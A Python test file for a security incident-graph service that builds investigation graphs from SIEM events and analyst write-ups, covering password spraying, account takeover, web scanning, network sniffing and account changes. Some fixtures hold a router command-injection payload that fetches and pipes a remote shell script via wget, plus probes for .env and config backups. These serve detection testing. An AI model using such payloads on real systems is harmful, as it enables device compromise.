from __future__ import annotations

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
sys.modules.pop("app", None)

from app.services.assistant_incident_graph_service import (
    build_assistant_incident_graph,
    buildGraphFromFacts,
    buildGraphFromEvents,
    extractFacts,
    normalizeEvents,
    validateGraph,
)


def sample_password_spray_events() -> list[dict]:
    return [
        {
            "@timestamp": "2026-05-12T11:02:14.221Z",
            "event_type": "authentication",
            "event_action": "login_failed",
            "event_outcome": "failure",
            "source_ip": "185.234.219.41",
            "source_country": "NL",
            "source_asn": "AS20473",
            "source_provider": "Vultr",
            "email_address": "ana.popescu@company.com",
            "destination_app": "Microsoft 365",
            "auth_provider": "Okta",
        },
        {
            "@timestamp": "2026-05-12T11:02:19.734Z",
            "event_type": "authentication",
            "event_action": "login_failed",
            "event_outcome": "failure",
            "source_ip": "185.234.219.41",
            "email_address": "m.ionescu@company.com",
            "destination_app": "Microsoft 365",
            "auth_provider": "Okta",
        },
        {
            "@timestamp": "2026-05-12T11:03:04.551Z",
            "event_type": "security-alert",
            "alert_name": "passwordSpray",
            "alert_severity": "high",
            "source_ip": "185.234.219.41",
            "failed_login_count": 18,
            "distinct_email_count": 9,
            "targeted_accounts": [
                "ana.popescu@company.com",
                "m.ionescu@company.com",
                "it.support@company.com",
            ],
        },
        {
            "@timestamp": "2026-05-12T11:04:12.019Z",
            "event_type": "authentication",
            "event_action": "login_success",
            "event_outcome": "success",
            "source_ip": "185.234.219.41",
            "email_address": "m.ionescu@company.com",
            "mfa_result": "push_approved",
            "destination_app": "Microsoft 365",
            "risk_reason": "Successful login from same source shortly after previous failed attempts.",
        },
        {
            "@timestamp": "2026-05-12T11:06:09.337Z",
            "event_type": "cloud-app",
            "event_action": "mailbox_rule_created",
            "email_address": "m.ionescu@company.com",
            "source_ip": "185.234.219.41",
            "app": "Exchange Online",
            "rule_name": "Invoice Processing",
        },
        {
            "@timestamp": "2026-05-12T11:07:48.680Z",
            "event_type": "cloud-app",
            "event_action": "file_accessed",
            "email_address": "m.ionescu@company.com",
            "source_ip": "185.234.219.41",
            "app": "SharePoint Online",
            "file_name": "Vendor_Payments_Q2.xlsx",
        },
        {
            "@timestamp": "2026-05-12T11:09:43.901Z",
            "event_type": "dns",
            "event_action": "dns_query",
            "event_outcome": "blocked",
            "hostname": "NBI0697",
            "endpoint_ip": "10.16.19.67",
            "email_address": "m.ionescu@company.com",
            "query": "login-verify-example.com",
            "query_category": "phishing",
        },
    ]


def test_password_spray_creates_one_alert_and_three_user_nodes() -> None:
    graph = buildGraphFromEvents(sample_password_spray_events())

    assert sum(1 for node in graph["nodes"] if node["type"] == "alert") == 1
    assert sum(1 for node in graph["nodes"] if node["type"] == "user") == 3
    assert any(edge["label"] == "generated" for edge in graph["edges"])
    assert sum(1 for edge in graph["edges"] if edge["label"] == "targeted") == 3


def test_successful_login_after_spray_marks_that_user_critical() -> None:
    graph = buildGraphFromEvents(sample_password_spray_events())

    compromised = next(node for node in graph["nodes"] if node["label"] == "m.ionescu@company.com")
    other = next(node for node in graph["nodes"] if node["label"] == "ana.popescu@company.com")
    assert compromised["severity"] == "critical"
    assert compromised["role"] == "compromised_identity"
    assert other["severity"] == "medium"
    assert not any(edge["from"] == other["id"] and edge["label"] == "auth success" for edge in graph["edges"])


def test_mailbox_rule_after_suspicious_login_creates_mail_node_and_edge() -> None:
    graph = buildGraphFromEvents(sample_password_spray_events())

    mail = next(node for node in graph["nodes"] if node["type"] == "mail")
    success = next(node for node in graph["nodes"] if node["type"] == "success")
    assert mail["label"] == "Invoice Processing"
    assert any(edge["from"] == success["id"] and edge["to"] == mail["id"] and edge["label"] == "post-login activity" for edge in graph["edges"])


def test_dns_query_creates_domain_node_and_endpoint_relationship() -> None:
    graph = buildGraphFromEvents(sample_password_spray_events())

    endpoint = next(node for node in graph["nodes"] if node["type"] == "endpoint")
    domain = next(node for node in graph["nodes"] if node["type"] == "domain")
    assert endpoint["label"] == "NBI0697"
    assert domain["label"] == "login-verify-example.com"
    assert any(edge["from"] == endpoint["id"] and edge["to"] == domain["id"] and edge["label"] == "dns query" for edge in graph["edges"])


def test_duplicate_events_do_not_create_duplicate_nodes_or_edges() -> None:
    events = sample_password_spray_events()
    graph = buildGraphFromEvents(events + events)
    node_ids = [node["id"] for node in graph["nodes"]]
    edge_keys = [(edge["from"], edge["to"], edge["label"]) for edge in graph["edges"]]

    assert len(node_ids) == len(set(node_ids))
    assert len(edge_keys) == len(set(edge_keys))


def test_graph_validation_fails_for_missing_edge_node() -> None:
    graph = buildGraphFromFacts(extractFacts(normalizeEvents(sample_password_spray_events())))
    graph["edges"].append({"from": "missing-node", "to": graph["nodes"][0]["id"], "label": "broken"})

    checks = validateGraph(graph)
    assert any(check["name"] == "all edges reference valid nodes" and not check["passed"] for check in checks)


def test_account_takeover_marks_success_critical_and_mail_high() -> None:
    graph = buildGraphFromEvents(sample_password_spray_events())

    success = next(node for node in graph["nodes"] if node["type"] == "success")
    mail = next(node for node in graph["nodes"] if node["type"] == "mail")
    compromised = next(node for node in graph["nodes"] if node["label"] == "m.ionescu@company.com")
    assert compromised["severity"] == "critical"
    assert success["severity"] == "critical"
    assert mail["severity"] == "high"


def test_web_exploitation_campaign_uses_attempt_edges_not_compromise_edges() -> None:
    events = [
        {"event_type": "web", "source_ip": "93.123.109.214", "request_uri": "/.env.bak"},
        {"event_type": "web", "source_ip": "45.148.10.62", "request_uri": "/config.php.bak"},
        {"event_type": "web", "source_ip": "221.159.119.6", "request_uri": "/server-status"},
        {
            "event_type": "web",
            "source_ip": "35.216.140.3",
            "request_uri": "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget http://router.tplink.sh/a.sh -O- | sh)",
        },
    ]
    graph = buildGraphFromEvents(events)

    assert graph["summary"]["investigationType"] == "web_exploitation_campaign"
    assert sum(1 for node in graph["nodes"] if node["type"] == "ip") == 4
    assert any(node["type"] == "url" and node["label"] == "/.env.bak" for node in graph["nodes"])
    assert any(node["type"] == "command" for node in graph["nodes"])
    assert any(node["type"] == "domain" and node["label"] == "router.tplink.sh" for node in graph["nodes"])
    assert any(edge["label"] == "attempted exploit" for edge in graph["edges"])
    assert not any("compromise" in edge["label"].lower() or "executed successfully" in edge["label"].lower() for edge in graph["edges"])


def test_network_sniffing_promiscuous_mode_builds_mitre_graph() -> None:
    graph = buildGraphFromEvents([
        {
            "hostname": "venus25-vm",
            "network_interface": "ens18",
            "event_action": "promiscuous_mode",
            "message": "ens18 entered promiscuous mode",
            "mitre_technique": "T1040",
        }
    ])

    assert graph["summary"]["investigationType"] == "network_sniffing"
    assert any(node["type"] == "endpoint" and node["label"] == "venus25-vm" for node in graph["nodes"])
    assert any(node["type"] == "alert" and "Promiscuous" in node["label"] for node in graph["nodes"])
    assert any(node["type"] == "mitre" and node["label"] == "T1040" for node in graph["nodes"])


def test_log_volume_anomaly_builds_source_and_count_nodes() -> None:
    graph = buildGraphFromEvents([
        {
            "hostname": "siembiotportal",
            "rule_name": "High fired rule aggregation",
            "firedtimes": 81441,
        }
    ])

    assert graph["summary"]["investigationType"] == "log_volume_anomaly"
    assert any(node["label"] == "siembiotportal" for node in graph["nodes"])
    assert any(node["type"] == "volume" and "81,441" in node["label"] for node in graph["nodes"])


def test_dns_phishing_activity_blocks_domain_edge() -> None:
    graph = buildGraphFromEvents([
        {
            "event_type": "dns",
            "event_action": "dns_query",
            "event_outcome": "blocked",
            "hostname": "NBI0697",
            "email_address": "m.ionescu@company.com",
            "query": "login-verify-example.com",
            "app": "DNS Resolver",
            "query_category": "phishing",
        }
    ])

    assert graph["summary"]["investigationType"] == "dns_phishing_activity"
    assert any(node["type"] == "endpoint" and node["label"] == "NBI0697" for node in graph["nodes"])
    assert any(node["type"] == "domain" and node["label"] == "login-verify-example.com" for node in graph["nodes"])
    assert any(edge["label"] == "blocked" for edge in graph["edges"])


def test_example_multi_cluster_web_sniffing_volume_stays_cautious() -> None:
    graph = buildGraphFromEvents([
        "Multiple suspicious web requests detected from 93.123.109.214, 45.148.10.62, 221.159.119.6, and 35.216.140.3 targeting /config.php.bak, /.env.bak, /server-status, and a LuCI command-injection payload wget http://router.tplink.sh/a.sh -O- | sh.",
        "Promiscuous mode activity detected on venus25-vm with ens18 entering promiscuous mode, MITRE T1040.",
        "High-volume alert aggregation from siembiotportal with firedtimes ranging from 427 to 81,441.",
        "Recurring attack pattern over 06:00-07:16 UTC.",
    ])

    assert graph["summary"]["investigationType"] == "generic_multi_cluster_investigation"
    assert sum(1 for node in graph["nodes"] if node["type"] == "ip") == 4
    assert any(node["label"] == "router.tplink.sh" for node in graph["nodes"])
    assert any(node["label"] == "venus25-vm" for node in graph["nodes"])
    assert any(node["type"] == "volume" for node in graph["nodes"])
    assert any(edge["label"] in {"possible volume driver", "time-correlated"} for edge in graph["edges"])
    assert not any(edge["from"].startswith("ip-") and "venus25-vm" in edge["to"] for edge in graph["edges"])


def test_assistant_graph_uses_event_interpretation_as_supplemental_evidence() -> None:
    class Entry:
        entry_index = 0
        raw_text = "rule id 1002 fired on smbfront-c31"
        sanitized_text = raw_text
        token_map_json = {}
        entry_label = "raw-alert"

    class Session:
        title = "Event Interpretation"
        entries = [Entry()]

    report = """
# Event Interpretation

- **Repeated web reconnaissance and exploitation attempts**: Multiple sources (93.123.109.214, 45.148.10.62, 221.159.119.6, 35.216.140.3) targeted common attack vectors including `/config.php.bak`, `/.env.bak`, and CGI endpoints with command injection payloads (`$(wget http://0.0.0.0/router.tplink.sh -O-|sh)`) and `/server-status` probes between 06:00-06:10 UTC on 2026-05-13.

- **Network sniffing capability detected on infrastructure**: venus25-vm kernel log at 06:57:19 UTC shows device ens18 entering promiscuous mode (rule ID 5104, severity 8), consistent with MITRE T1040.

- **Recurring pattern across multiple agents and time windows**: Alert rule ID 1002 fired 8945+ times on smbfront-c31, and similar queries appear in siembiotportal logs across wm-c31, wm-c31, and secondary hosts.

- **Remote payload staging infrastructure identified**: URL references to `http://0.0.0.0/router.tplink.sh` in multiple HTTP requests indicate attacker infrastructure.
"""
    graph = build_assistant_incident_graph(Session(), report)

    assert graph["summary"]["investigationType"] == "generic_multi_cluster_investigation"
    assert sum(1 for node in graph["nodes"] if node["type"] == "ip") == 4
    assert not any(node["type"] == "ip" and node["label"] == "0.0.0.0" for node in graph["nodes"])
    assert any(node["type"] == "url" and node["label"] == "/config.php.bak" for node in graph["nodes"])
    assert any(node["type"] == "domain" and node["label"] == "router.tplink.sh" for node in graph["nodes"])
    assert any(node["type"] == "endpoint" and node["label"] == "venus25-vm" for node in graph["nodes"])
    assert any(node["type"] == "network" and node["label"] == "ens18" for node in graph["nodes"])
    assert any(node["type"] == "volume" and "8,945" in node["label"] for node in graph["nodes"])
    assert any(edge["label"] in {"possible volume driver", "time-correlated"} for edge in graph["edges"])
    assert not any(edge["from"].startswith("ip-") and "venus25-vm" in edge["to"] for edge in graph["edges"])


def test_azure_oauth_interpretation_builds_cloud_identity_graph_not_process_or_web() -> None:
    interpretation = """
# Event Interpretation
- **Azure AD successful OAuth2 login:** vanessa.schockaert@oost-vlaanderen.be authenticated to Office 365 from 193.190.147.2 using Edge browser on a Windows 10 device (NBE0176), with result status "Success" and a "Redirect" outcome.
- **Kerberos service ticket requests to Azure AD SSO and file services:** E0105@POVGRP.OOST-VLAANDEREN.BE requested service tickets from 10.64.7.136 to AZUREADSSOACC$ and VS13_CIFSNFS$ on SERDC03.povgrp.oost-vlaanderen.be, both with successful status.
- **OneDrive SyncEngine managed device access:** vanessa.schockaert@oost-vlaanderen.be connected the OneDrive SyncEngine client from 193.190.147.2 to SharePoint/OneDrive with OAuth authentication on a managed Windows 10 device.
- **No malicious indicators detected:** All events show successful authentication, standard encryption types, compliant device status, and expected service operations; no failed logons or suspicious process behavior.
"""
    graph = buildGraphFromEvents([{"raw_text": interpretation, "rawRef": "interpretation"}], interpretation)

    assert graph["summary"]["investigationType"] == "generic_multi_cluster_investigation"
    assert any(node["type"] == "alert" and node["label"] == "Cloud Identity Activity" for node in graph["nodes"])
    assert any(node["type"] == "user" and node["label"] == "vanessa.schockaert@oost-vlaanderen.be" for node in graph["nodes"])
    assert any(node["type"] == "ip" and node["label"] == "193.190.147.2" for node in graph["nodes"])
    assert any(node["type"] == "endpoint" and node["label"] == "NBE0176" for node in graph["nodes"])
    assert any(node["type"] == "app" and node["label"] == "Office 365" for node in graph["nodes"])
    assert not any(node["type"] == "alert" and "Takeover" in node["label"] for node in graph["nodes"])
    assert not any(edge["label"] == "attempted exploit" for edge in graph["edges"])


def test_account_lifecycle_interpretation_builds_identity_change_graph_not_volume() -> None:
    interpretation = """
# Event Interpretation

- Four user accounts (chorarias7546, kaulsayn2763, servaism1779, levyj8589) were deleted in rapid succession (within ~1 second) on May 17, 2026 at 04:00:11-04:00:12 UTC, all initiated by svc-all-prd-snmid on domain controller vm-reu-prd-dc1.bre-europe2.local.
- Approximately 13 minutes later, a new account manningi3178 was created by the same svc-all-prd-snmid actor, then immediately configured with an account expiration date of June 27, 2026, and enabled for use.
- All events logged as "AUDIT_SUCCESS" from the Windows Security-Auditing provider, confirming successful execution of directory modifications.
"""
    graph = buildGraphFromEvents([{"raw_text": interpretation, "rawRef": "interpretation"}], interpretation)

    assert graph["summary"]["investigationType"] == "identity_account_lifecycle"
    assert any(node["type"] == "alert" and node["label"] == "Account Lifecycle Manipulation" for node in graph["nodes"])
    assert any(node["type"] == "user" and node["label"] == "svc-all-prd-snmid" for node in graph["nodes"])
    assert any(node["type"] == "endpoint" and node["label"] == "vm-reu-prd-dc1" for node in graph["nodes"])
    for account in ["chorarias7546", "kaulsayn2763", "servaism1779", "levyj8589", "manningi3178"]:
        assert any(node["type"] == "user" and node["label"] == account for node in graph["nodes"])
    assert any(edge["label"] == "deleted" for edge in graph["edges"])
    assert any(edge["label"] == "created account" for edge in graph["edges"])
    assert any(edge["label"] == "configured expiration" for edge in graph["edges"])
    assert any(edge["label"] == "enabled" for edge in graph["edges"])
    assert not any(node["type"] == "volume" for node in graph["nodes"])


def test_account_lifecycle_ignores_grammar_words_as_account_names() -> None:
    interpretation = """
# Event Interpretation
- Four user accounts (chorarias7546, kaulsayn2763, servaism1779, levyj8589) were deleted by svc-all-prd-snmid.
- Approximately 13 minutes later, a new account was created by the same svc-all-prd-snmid actor and enabled for use.
"""
    graph = buildGraphFromEvents([{"raw_text": interpretation, "rawRef": "interpretation"}], interpretation)

    deleted_batch = next(node for node in graph["nodes"] if node["type"] == "success" and "account deletion" in node["label"])
    assert deleted_batch["label"] == "4 account deletions"
    assert not any(node["type"] == "user" and node["label"].lower() == "was" for node in graph["nodes"])


def test_pasted_json_array_string_expands_into_events() -> None:
    raw_text = json.dumps(sample_password_spray_events())
    graph = buildGraphFromEvents([{"raw_text": raw_text, "rawRef": "entry-1"}])

    assert sum(1 for node in graph["nodes"] if node["type"] == "alert") == 1
    assert any(node["label"] == "185.234.219.41" for node in graph["nodes"])
    assert graph["summary"]["primaryIdentity"] == "m.ionescu@company.com"


def test_process_alert_builds_generic_endpoint_process_graph() -> None:
    raw = r"""{input={type=log}, agent={ip=10.10.126.89, name=EXP-DCHWTG3}, @timestamp=2026-05-13T06:04:23.504Z, data={win={eventdata={image=C:\\Windows\\System32\\svchost.exe, parentImage=C:\\Windows\\System32\\svchost.exe, commandLine=C:\\WINDOWS\\system32\\svchost.exe -k appmodel -p -s StateRepository, parentCommandLine=C:\\WINDOWS\\system32\\svchost.exe -k appmodel -p -s StateRepository, processId=41332, parentProcessId=5332, user=NT AUTHORITY\\SYSTEM}, system={message="Process Create: ProcessId: 41332 Image: C:\Windows\System32\svchost.exe CommandLine: C:\WINDOWS\system32\svchost.exe -k appmodel -p -s StateRepository User: NT AUTHORITY\SYSTEM ParentProcessId: 5332 ParentImage: C:\Windows\System32\svchost.exe ParentCommandLine: C:\WINDOWS\system32\svchost.exe -k appmodel -p -s StateRepository"}}}, rule={level=12, description=Windows Sysmon - Possible process masquerading, id=110160}}"""
    graph = buildGraphFromEvents([{"raw_text": raw, "rawRef": "entry-1"}])

    assert any(node["type"] == "alert" for node in graph["nodes"])
    assert any(node["type"] == "endpoint" and node["label"] == "EXP-DCHWTG3" for node in graph["nodes"])
    assert any(node["type"] == "process" and node["label"].lower() == "svchost.exe" for node in graph["nodes"])
    assert any(edge["label"] in {"flagged", "spawned", "generated"} for edge in graph["edges"])


def test_roslyn_vscode_false_positive_does_not_become_web_attack() -> None:
    interpretation = r"""
# Event Interpretation

- An executable file with SHA1 hash `7c8fbcb67bbdadac13229526343d33adfe7e6782` was detected at an uncommon file path (`C:\Users\did58\AppData\Local\Temp\Roslyn\AnalyzerAssemblyLoader\d58981a6cde541e38d27a5815ca4511e\15\Microsoft.CodeAnalysis.CSharp.dll`) on endpoint NBI0699, triggering a medium-severity alert for obfuscation techniques (MITRE T1036).
- The executable originated from a legitimate VS Code C# extension process (`ms-dotnettools.csharp-2.140.8-win32-x64`), specifically from the .roslyn directory, which is a known path for Roslyn analyzer compilation artifacts used by the extension.
- The process command line contains multiple extension paths and configuration parameters typical of VS Code language server initialization, indicating this is likely part of the C# extension's normal build or analyzer assembly loading workflow rather than malicious activity.
- No evidence of malicious command injection, remote execution, or unauthorized network communication is present in the alert data.
- The alert appears to be a false positive driven by the detection of an executable in a temporary directory path.
"""
    graph = buildGraphFromEvents([{"raw_text": interpretation, "rawRef": "interpretation"}], interpretation)

    assert graph["summary"]["investigationType"] == "development_tool_false_positive"
    assert graph["summary"]["risk"] in {"Low", "Medium"}
    assert any(node["type"] == "endpoint" and node["label"] == "NBI0699" for node in graph["nodes"])
    assert any(node["type"] == "process" and "ms-dotnettools.csharp" in node["label"] for node in graph["nodes"])
    assert any(node["type"] == "file" and node["label"] == "Microsoft.CodeAnalysis.CSharp.dll" for node in graph["nodes"])
    assert any(node["type"] == "mitre" and node["label"] == "T1036" for node in graph["nodes"])
    assert any(node["type"] == "alert" and node["label"] == "Likely False Positive" for node in graph["nodes"])
    assert not any(node["label"] == "Web Attack Campaign" for node in graph["nodes"])
    assert not any(edge["label"] == "attempted exploit" for edge in graph["edges"])
